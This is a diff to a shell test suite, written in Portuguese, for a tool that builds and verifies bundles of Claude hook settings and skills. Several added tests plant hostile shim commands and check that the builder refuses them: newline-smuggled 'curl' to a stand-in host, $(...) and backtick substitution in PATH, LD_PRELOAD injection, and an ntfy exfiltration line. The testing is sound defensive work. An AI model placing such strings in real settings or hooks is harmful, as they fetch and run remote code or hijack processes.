@@ -13,7 +13,13 @@
 #   ou sobrou arquivo, ou se o manifest não dá para ler ou tem entrada sem sha256) · settings com JSON válido de forma
 #   inesperada (hooks como lista) recusa dizendo "formato inesperado" · regra de permissão de macOS: em allow sai e fica CONTADA
 #   no manifest, em deny/ask recusa · script cujo nome só CONTÉM o de um keep recusa · OUT não gravável: a mensagem diz "não consegui gravar", não culpa
-#   a entrada; troca de OUT que falha (guarda de comportamento que já existia) deixa o bundle anterior intacto.
+#   a entrada; troca de OUT que falha (guarda de comportamento que já existia) deixa o bundle anterior intacto ·
+#   shim comparado INTEIRO: 2º comando depois de newline / CR / newline no fim / $(...) ou crase no PATH / PATH que não é o
+#   literal do gc / variável que não é GC_* / subcomando que só começa igual / veredito de um token e execução de outro recusam,
+#   e shim_needs guarda o subcomando e os argumentos como enviados · grupo de hooks sem a chave hooks recusa · guardas de conteúdo (teto de tamanho, NUL,
+#   /Users/ em comentário e em settings, CNPJ, ntfy, telefone BR em 5 formatos sem falso positivo em timestamp/hex) · reescrita de
+#   caminho com fronteira · raiz de OUT 0755 · verify acusa bundle_hash errado/ausente, arquivo+manifest.files editados juntos e
+#   bit de execução · manifest com tipo errado (exec) sai 4 sem traceback · --skills com arquivo solto, pasta vazia ou skill sem arquivo.
 # CONTROLE NEGATIVO: a tabela POLICY perde a linha de um hook (sed) e o mesmo build TEM que passar a recusar.
 set -u
 HERE="$(cd "$(dirname "$0")" && pwd)"
@@ -100,6 +106,8 @@ fresh; build "$T/f" "$T/f/out"; rm "$T/f/out/manifest.json"; python3 -I "$B" ver
 fresh; build "$T/f" "$T/f/out"; echo '{"files": 7}' > "$T/f/out/manifest.json"; python3 -I "$B" verify "$T/f/out" 2>/dev/null; [ $? = 4 ]; ok $? "verify com manifest.json sem 'files' válido sai 4"
 fresh; build "$T/f" "$T/f/out"; jq '.files |= with_entries(.value |= del(.sha256))' "$T/f/out/manifest.json" > "$T/m.json" && cp "$T/m.json" "$T/f/out/manifest.json"
 python3 -I "$B" verify "$T/f/out" 2>/dev/null; [ $? = 4 ]; ok $? "verify com entrada de manifest sem sha256 sai 4 (não estoura traceback)"
+fresh; build "$T/f" "$T/f/out"; jq '.files |= with_entries(.value.exec = "yes")' "$T/f/out/manifest.json" > "$T/m.json" && cp "$T/m.json" "$T/f/out/manifest.json"
+python3 -I "$B" verify "$T/f/out" 2>"$T/err"; rc=$?; [ $rc = 4 ] && ! has "$T/err" Traceback; ok $? "verify com 'exec' de tipo errado sai 4 com mensagem, sem traceback (rc=$rc)"
 
 # --- gravar OUT: o que falha aqui é a saída, e a mensagem não pode culpar a entrada ---
 fresh; : > "$T/f/umarquivo"; build "$T/f" "$T/f/umarquivo/out"; rc=$?
@@ -137,6 +145,69 @@ sed -i.bak 's#~/.claude/hooks/filter-bash-output.sh#~/.claude/hooks/my-filter-ba
 refuses "script que só CONTÉM o nome de um keep (my-filter-bash-output.sh; o arquivo existe)" "$T/f"
 has "$T/err" "my-filter-bash-output.sh"; ok $? "  a mensagem diz QUAL script"
 
+# --- shim: o que o shell executaria tem que ser IGUAL ao que o builder decidiu (fullmatch, sem strip nem normalização) ---
+CS=gt/.gascity-gastown-hq/.gc/settings.json; PATHLIT='\$HOME/go/bin:\$HOME/.local/bin:\$PATH'
+fresh; sed -i.bak 's#gc nudge drain --inject#gc nudge drain --inject\\ncurl http://x.invalid/p#' "$T/f/$CS"
+refuses "shim com 2º comando depois de NEWLINE" "$T/f"
+fresh; sed -i.bak 's#gc nudge drain --inject#gc nudge drain --inject\\r#' "$T/f/$CS"
+refuses "shim com caractere de controle (CR)" "$T/f"
+fresh; sed -i.bak 's#gc mail check --inject#gc mail check --inject\\n#' "$T/f/$CS"
+refuses "shim com NEWLINE no fim (o strip() + \$ escondiam)" "$T/f"
+fresh; sed -i.bak "s#$PATHLIT#\$(curl http://x.invalid/p)#" "$T/f/$CS"
+refuses "export PATH com \$(...) dentro das aspas" "$T/f"
+fresh; sed -i.bak "s#$PATHLIT#\`curl http://x.invalid/p\`#" "$T/f/$CS"
+refuses "export PATH com crase dentro das aspas" "$T/f"
+fresh; sed -i.bak "s#$PATHLIT#\$HOME/go/bin:/tmp/x:\$PATH#" "$T/f/$CS"
+refuses "export PATH que não é o literal que o gc injeta" "$T/f"
+fresh; sed -i.bak 's#GC_HOOK_EVENT_NAME=SessionStart#LD_PRELOAD=evil#' "$T/f/$CS"
+refuses "shim com variável de ambiente que não é GC_*" "$T/f"
+fresh; sed -i.bak 's#gc nudge drain --inject#gc nudge drain-all --inject#' "$T/f/$CS"
+refuses "shim de subcomando que só COMEÇA igual (nudge drain-all)" "$T/f"
+fresh; sed -i.bak 's#gc handoff --auto \\"context cycle\\"#gc prime --hook gc handoff#' "$T/f/$CS"
+refuses "shim decidido por um token (gc handoff) e que executa outro (gc prime)" "$T/f"
+fresh; printf '{"hooks": {"Stop": [{"type": "command", "command": "~/.claude/hooks/filter-bash-output.sh"}]}}\n' > "$T/f/$CS"
+refuses "grupo de hooks sem a chave hooks (forma plana não é descartada em silêncio)" "$T/f"
+has "$T/err" 'sem a lista `hooks`'; ok $? "  a mensagem diz o que faltou (não o KeyError cru do formato inesperado)"
+fresh; sed -i.bak 's#gc mail check --inject#gc mail check  --inject#' "$T/f/$CS"; build "$T/f" "$T/f/out"; rc=$?
+[ $rc = 0 ] && jq -e '.shim_needs | index("mail check  --inject") != null' "$T/f/out/manifest.json" >/dev/null && has "$T/f/out/city/settings.json" 'gc mail check  --inject'
+ok $? "shim_needs registra a string ENVIADA (2 espaços ficam 2 espaços; antes era normalizada)"
+
+# --- guardas de conteúdo que só tinham o caso CPF/sk- (mutantes sobreviviam) ---
+KS=home/.claude/hooks/filter-bash-output.sh
+fresh; { printf '# '; head -c 600000 /dev/zero | tr '\0' a; printf '\n'; } >> "$T/f/$KS"
+refuses "script keep acima do teto de tamanho" "$T/f"
+fresh; printf '\0' >> "$T/f/$KS"
+refuses "script keep com byte NUL (binário)" "$T/f"
+fresh; printf '# veja /Users/fulano/x\n' >> "$T/f/$KS"
+refuses "caminho do mini em COMENTÁRIO de script keep" "$T/f"
+has "$T/err" "sobrando"; ok $? "  a mensagem vem da guarda final (/Users/ sobrando)"
+fresh; sed -i.bak 's#"A": "1"#"A": "/Users/fulano/x"#' "$T/f/$CS"
+refuses "/Users/ de OUTRO usuário em settings (nenhuma regra de reescrita o cobre)" "$T/f"
+fresh; printf 'X=%s\n' "$(printf '%s.%s.%s/%s-%s' 11 222 333 0001 44)" >> "$T/f/$KS"
+refuses "CNPJ plantado em script keep" "$T/f"
+fresh; printf 'curl ntfy.sh/%s\n' topicosecreto1 >> "$T/f/$KS"
+refuses "tópico ntfy plantado em script keep" "$T/f"
+for tel in '+55 31 99999-1234' '(31) 99999-1234' '31 99999-1234' '31999991234' '5531999991234'; do
+  fresh; printf 'X="%s"\n' "$tel" >> "$T/f/$KS"
+  refuses "telefone BR '$tel' em script keep" "$T/f"
+done
+fresh; printf 'TS=1791934013; MS=1791934013000; H=ab31999991234cd\n' >> "$T/f/$KS"; build "$T/f" "$T/f/out"
+ok $? "timestamp (10 e 13 dígitos) e dígitos dentro de hex NÃO são telefone (sem falso positivo)"
+
+# --- reescrita de caminho com fronteira, modo de OUT, verify do bundle_hash e do bit de execução ---
+fresh; sed -i.bak "s#\"A\": \"1\"#\"A\": \"$T/f/gt-backup/x\", \"B\": \"$T/f/gt2\"#" "$T/f/$CS"; build "$T/f" "$T/f/out"; rc=$?
+[ $rc = 0 ] && ! grep -rqE 'work-backup|work2' "$T/f/out"; ok $? "reescrita de caminho respeita fronteira (gt-backup e gt2 não viram work-backup / work2) (rc=$rc)"
+fresh; build "$T/f" "$T/f/out"; [ "$(python3 -I -c 'import os,sys;print(oct(os.stat(sys.argv[1]).st_mode&0o777))' "$T/f/out")" = 0o755 ]
+ok $? "raiz de OUT sai 0755 (mkdtemp deixava 0700 com o conteúdo em 0755/0644)"
+fresh; build "$T/f" "$T/f/out"; jq '.bundle_hash = "deadbeef"' "$T/f/out/manifest.json" > "$T/m.json" && cp "$T/m.json" "$T/f/out/manifest.json"
+python3 -I "$B" verify "$T/f/out" 2>"$T/err"; rc=$?; [ $rc = 4 ] && has "$T/err" bundle_hash; ok $? "verify acusa bundle_hash errado (4, e diz bundle_hash) (rc=$rc)"
+fresh; build "$T/f" "$T/f/out"; jq 'del(.bundle_hash)' "$T/f/out/manifest.json" > "$T/m.json" && cp "$T/m.json" "$T/f/out/manifest.json"
+python3 -I "$B" verify "$T/f/out" 2>/dev/null; [ $? = 4 ]; ok $? "verify acusa bundle_hash AUSENTE (4)"
+fresh; build "$T/f" "$T/f/out"; echo '# v2' >> "$T/f/out/$KS"; SHA=$(shasum -a 256 "$T/f/out/$KS" | cut -d' ' -f1)
+jq --arg s "$SHA" --arg k "$KS" '.files[$k].sha256 = $s' "$T/f/out/manifest.json" > "$T/m.json" && cp "$T/m.json" "$T/f/out/manifest.json"
+python3 -I "$B" verify "$T/f/out" 2>/dev/null; [ $? = 4 ]; ok $? "verify acusa arquivo E manifest.files editados juntos (bundle_hash fica velho) (4)"
+fresh; build "$T/f" "$T/f/out"; chmod -x "$T/f/out/$KS"; python3 -I "$B" verify "$T/f/out" 2>/dev/null; [ $? = 4 ]; ok $? "verify acusa bit de execução perdido (4)"
+
 # --- skills (--skills) ---
 fresh; build "$T/f" "$T/f/out" --skills; rc=$?
 [ $rc = 0 ] && [ -f "$T/f/out/role/dog/.claude/skills/ok-skill/SKILL.md" ] && [ ! -L "$T/f/out/role/dog/.claude/skills/ok-skill" ]; ok $? "skill é desreferenciada (arquivo comum, não link)"
@@ -149,6 +220,12 @@ refuses "skill que é symlink para fora da cidade" "$T/f" --skills
 fresh; mkdir -p "$T/f/fora"; ln -s "$T/f/fora" "$T/f/gt/.gascity-gastown-hq/skills/ok-skill/dados"
 refuses "skill com symlink de DIRETÓRIO por dentro (antes era pulado em silêncio)" "$T/f" --skills
 has "$T/err" "symlink interno dados"; ok $? "  a mensagem diz QUAL symlink"
+fresh; : > "$T/f/gt/.gascity-gastown-hq/.gc/agents/dog/.claude/skills/solto.md"
+refuses "skills/ com arquivo solto (não é diretório)" "$T/f" --skills
+fresh; rm "$T/f/gt/.gascity-gastown-hq/.gc/agents/dog/.claude/skills/ok-skill"
+refuses "--skills com diretório vazio entregaria 0 skills (pedido ≠ entregue)" "$T/f" --skills
+fresh; mkdir -p "$T/f/gt/.gascity-gastown-hq/skills/vazia"; ln -s "$T/f/gt/.gascity-gastown-hq/skills/vazia" "$T/f/gt/.gascity-gastown-hq/.gc/agents/dog/.claude/skills/vazia"
+refuses "skill que é pasta sem nenhum arquivo (não conta como entregue)" "$T/f" --skills
 
 # --- controle negativo: sem a linha da tabela de um hook, o builder tem que recusar o mesmo build ---
 fresh; sed '/"filter-bash-output.sh", "keep"/d' "$B" > "$T/mutant.py"
